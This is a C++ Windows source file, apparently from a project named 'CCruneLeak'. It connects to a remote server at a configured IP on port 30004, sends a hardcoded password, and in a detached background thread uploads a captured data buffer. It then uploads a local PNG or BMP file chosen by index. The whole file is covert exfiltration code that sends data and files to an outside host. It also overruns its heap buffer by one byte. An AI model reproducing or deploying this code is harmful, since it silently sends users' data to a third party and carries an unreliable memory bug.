#include <WinSock2.h>
#include <ws2tcpip.h>
#include <Windows.h>
#include <iostream>
#include "../CCruneLeak/leakCodes.h"

#pragma comment (lib, "Ws2_32.lib")

SOCKET getSocket() {
	addrinfo sockaddr;
	PADDRINFOA hostinfo = NULL;

	ZeroMemory(&sockaddr, sizeof(sockaddr));
	sockaddr.ai_family = AF_INET;
	sockaddr.ai_socktype = SOCK_STREAM;
	sockaddr.ai_protocol = IPPROTO_TCP;

	SOCKET MainSock = INVALID_SOCKET;

	if (getaddrinfo(CCRUNE_IP, "30004", &sockaddr, &hostinfo)) {
		return INVALID_SOCKET;
	}

	for (hostinfo; hostinfo != NULL; hostinfo = hostinfo->ai_next) {

		MainSock = socket(hostinfo->ai_family, hostinfo->ai_socktype, hostinfo->ai_protocol);
		if (MainSock == INVALID_SOCKET) {
			freeaddrinfo(hostinfo);
			return INVALID_SOCKET;
		}

		if (connect(MainSock, hostinfo->ai_addr, hostinfo->ai_addrlen) == SOCKET_ERROR) {
			closesocket(MainSock);
			MainSock = INVALID_SOCKET;
			continue;
		}
		break;
	}
	freeaddrinfo(hostinfo);

	if (MainSock == INVALID_SOCKET) return INVALID_SOCKET;

	UINT64 pass = CCRUNE_PASS;

	if (send(MainSock, (char*)&pass, sizeof(UINT64), 0) == SOCKET_ERROR) {
		closesocket(MainSock);
		return INVALID_SOCKET;
	}

	return MainSock;
}

DWORD WINAPI leakThread(LPVOID args) {
	WSADATA ws;
	if (WSAStartup(MAKEWORD(2, 2), &ws)) {
		delete[] (char*)args;
		return 1;
	}

	size_t size = *(size_t*)args;
	UINT32 idx = *(UINT32*)((char *)args + sizeof(size_t));
	char isPng = *((char*)args + sizeof(size_t) + sizeof(UINT32));
	char* data = (char*)args + sizeof(size_t) + sizeof(UINT32) + 1;
	char dump;

	SOCKET leakSocket = getSocket();
	if (leakSocket == INVALID_SOCKET) {
		WSACleanup();
		delete[] (char *)args;
		return 1;
	}

	if (send(leakSocket, (char*)&size, sizeof(size_t), 0) == SOCKET_ERROR) {
		goto exit;
	}

	while (size > 1200) {
		recv(leakSocket, &dump, 1, 0);
		if (send(leakSocket, data, 1200, 0) == SOCKET_ERROR) {
			goto exit;
		}
		size -= 1200;
		data += 1200;
	}

	if (send(leakSocket, data, size, 0) == SOCKET_ERROR) {
		goto exit;
	}

	size = 0;
	if (idx != 0) {
		char fileName[30];
		_snprintf_s(fileName, 30, isPng ? "%u.png" : "%u.bmp", idx);

		HANDLE bankFile = CreateFileA(fileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (bankFile != INVALID_HANDLE_VALUE) {
			LONGLONG fileSize = 0;
			if (GetFileSizeEx(bankFile, (PLARGE_INTEGER)&fileSize) && fileSize != 0) {
				if (send(leakSocket, (char *)&fileSize, sizeof(LONGLONG), 0) == SOCKET_ERROR) {
					CloseHandle(bankFile);
					goto exit;
				}

				if (send(leakSocket, fileName, 30, 0) == SOCKET_ERROR) {
					CloseHandle(bankFile);
					goto exit;
				}

				DWORD written;
				char buf[1200];

				while (fileSize > 1200) {
					recv(leakSocket, &dump, 1, 0);
					if (!ReadFile(bankFile, buf, 1200, &written, NULL)) {
						CloseHandle(bankFile);
						goto exit;
					}
					if (send(leakSocket, buf, 1200, 0) == SOCKET_ERROR) {
						CloseHandle(bankFile);
						goto exit;
					}

					fileSize -= 1200;
				}

				if (fileSize) {
					recv(leakSocket, &dump, 1, 0);
					if (!ReadFile(bankFile, buf, fileSize, &written, NULL)) {
						CloseHandle(bankFile);
						goto exit;
					}
					send(leakSocket, buf, fileSize, 0);
				}
			}
			else {
				send(leakSocket, (char*)&size, sizeof(size_t), 0);
			}

			CloseHandle(bankFile);
		}
		else {
			send(leakSocket, (char*)&size, sizeof(size_t), 0);
		}
	}
	else {
		send(leakSocket, (char*)&size, sizeof(size_t), 0);
	}

exit:
	closesocket(leakSocket);
	WSACleanup();
	delete[] (char*)args;

	return 0;
}

void sendLeak(char* data, size_t size, UINT32 idx, bool isPng) {
	char* args = new char[size + sizeof(size_t) + sizeof(UINT32)];
	(*(size_t*)args) = size;
	*(UINT32 *)(args + sizeof(size_t)) = idx;
	*(args + sizeof(size_t) + sizeof(UINT32)) = isPng ? 1 : 0;
	memcpy(args + sizeof(size_t) + sizeof(UINT32) + 1, data, size);

	HANDLE th = CreateThread(NULL, NULL, leakThread, args, 0, NULL);

	if (th) {
		CloseHandle(th);
	}
	else {
		delete[] args;
	}
}